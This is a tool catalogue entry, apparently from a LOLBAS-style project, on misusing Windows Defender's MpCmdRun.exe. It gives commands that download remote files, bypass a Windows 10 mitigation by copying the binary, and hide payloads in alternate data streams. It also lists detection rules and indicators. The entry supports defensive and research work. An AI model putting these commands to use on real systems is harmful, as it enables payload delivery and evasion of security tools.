---
id: windows-download-mpcmdrun
namespace: windows:download:mpcmdrun
name: mpcmdrun
description: 'Binary part of Windows Defender. Used to manage settings in Windows Defender Located at: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe; C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe; C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- network.transfer.download
- system.file.alternate-data-stream
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - filesystem_write
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- mpcmdrun
parameters: []
features: []
execution:
  template: mpcmdrun
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) (Download file)
  command: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}
- description: Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version to bypass Windows 10 mitigation. (Download file)
  command: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe
- description: Download file to machine and store it in Alternate Data Stream (Hide downloaded data into an Alternate Data Stream)
  command: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
references:
- label: command-line-arguments-microsoft-defender-antiviru
  url: https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus
- label: '1301263551638761477'
  url: https://twitter.com/mohammadaskar2/status/1301263551638761477
- label: '1301444858910052352'
  url: https://twitter.com/Oddvarmoe/status/1301444858910052352
- label: '1301506813242867720'
  url: https://twitter.com/NotMedic/status/1301506813242867720
techniques:
- exfiltration
- defense-evasion
mitre_ids:
- T1105
- T1564.004
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/159bf4bbc103cc2be3fef4b7c2e7c8b23b63fd10/rules/windows/process_creation/win_susp_mpcmdrun_download.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/6ef5c53b0c15e344f0f2d1649941391aea6fa253/rules/windows/command_and_control_remote_file_copy_mpcmdrun.toml
- type: ioc
  description: MpCmdRun storing data into alternate data streams.
- type: ioc
  description: MpCmdRun retrieving a file from a remote machine or the internet that is not expected.
- type: ioc
  description: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.
- type: ioc
  description: Monitor for the creation of %USERPROFILE%\AppData\Local\Temp\MpCmdRun.log
- type: ioc
  description: User Agent is "MpCommunication"
install:
- method: choco
  package_name: mpcmdrun
  commands:
  - choco install mpcmdrun
---


# mpcmdrun

mpcmdrun is a Windows LOLBin. Binary part of Windows Defender. Used to manage settings in Windows Defender Located at: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe; C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe; C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe.
